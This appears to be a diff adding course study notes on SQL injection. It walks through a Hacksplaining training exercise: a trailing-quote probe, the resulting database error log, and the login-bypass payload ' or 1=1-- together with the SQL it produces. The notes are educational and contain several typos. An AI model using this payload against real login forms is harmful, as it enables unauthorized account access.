@@ -25,6 +25,75 @@ Trainer: Knox Hutchinson
 
 ## The SQL Injection’; SELECT * FROM table
 
+- 3-tier application architecture
+  - tiers: web, app, and db
+  - typical data flow: web or mobile apps / Kiosk (frontend) $\rightleftarrow$ application server (backend) $\rightleftarrow$ SQL database
+  - frontend: web browser
+  - backend: analytics, customer support, shipping, etc.
+  - SQL db: storing cell files w/ SQL
+
+
+- SQL injection
+  - code sending code to app server or db directly
+  - malicious procedure
+    - web input field w/ SQL code to query info, e.g. `SELECT * FROM Table`
+    - possible SQL statements: `INSERT`, `DELETE`, `DROP`, etc.
+    - retrieve/delete user's sensitive info or insert brough data
+  - mitigation: backend validates the SQL statement
+
+
+- Demo: SQL injection
+  - resource: [SQL Injection exercise](https://www.hacksplaining.com/exercises/sql-injection#/start)
+  - web input: email = `user@email.com` password = `password` $\to$ Unknown email or password
+
+    ```shell
+    Rendering login page.
+    Checking supplied authentication details for user@email.com.
+    Finding user in database.
+    No such user, report this to the user (invalid credentials?).
+    Rendering login page.
+    ```
+
+  - web input: email = `user@email.com` password = `password'` $\to$ An unexpected error occurred.
+    - logs: The logs show a SQL syntax error. This indicates that athe quote characterr messed somthing up in an unexpeccted way.
+
+      ```shell
+      Checking supplied authentication details for user@email.com.
+      Finding user in database.
+      An error occurred: PG::SyntaxError: ERROR: unterminated quoted string at or near "'password'' limit 1" LINE 1: ...ers where email = 'user@email.com' and password = 'password'... ^ : select * from users where email = 'user@email.com' and password = 'password'' limit 1.
+      Unable to login this user due to unexpected error.
+      Rendering login page.
+      ```
+
+    - translated SQL code
+
+      ```sql
+      SELECT *
+        FROM users
+       WHERE email = 'user@email.com'
+          AND pass  = 'password'' LIMIT 1
+      ```
+    
+    - repeat the above input and observe the result
+    - This behavior indicates that the application might be valuable to SQL INjection
+
+      ```sql
+      SELECT *
+        FROM users
+       WHERE email = 'user@email.com'
+         AND pass  = 'password'' LIMIT 1
+      ```
+
+  - web input: email = `user@email.com` password = `' or 1=1--`
+    - We successfully gained access to the application without having to guess the password using SQL Injection.
+
+    ```sql
+    SELECT *
+      FROM users
+     WHERE email = 'user@email.com'
+       AND pass  = '' or 1=1--' LIMIT 1
+    ```
+
 
 
 ## Cross-Site Scripting; var doCode{}
